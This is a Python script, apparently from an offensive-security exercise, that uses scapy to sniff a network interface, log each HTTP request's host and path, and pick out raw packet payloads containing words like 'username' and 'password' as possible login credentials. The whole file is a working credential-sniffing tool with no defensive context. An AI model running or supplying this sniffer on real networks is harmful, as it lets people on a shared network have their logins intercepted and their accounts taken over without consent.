#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface to scan")
    user_options = parser.parse_args()[0]
    if not user_options.interface:
        print("[-] Please specify target interface, refer --help for more information")
    return user_options


def sniffer(interface):
    if interface is not None:
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    if packet is not None:
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet is not None:
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "password", "uname", "pass", "user", "login"]
            for keyword in keywords:
                if keyword in load:
                    return load


def process_sniffed_packet(packet):
    if packet is not None:
        if packet.haslayer(http.HTTPRequest):
            url = get_url(packet)
            print("[+] HTTP Request >> " + str(url))
            login_info = get_login_info(packet)
            if login_info:
                print("\n\n\n[+] Possible  Username/Password >> " + str(login_info) + "\n\n\n")


options = get_arguments()

try:
    sniffer(options.interface)
except KeyboardInterrupt:
    print("[+] Detected keyboard interrupt. Quitting .....")
except:
    print("[!] ~ERROR~ Could not run sniffer")
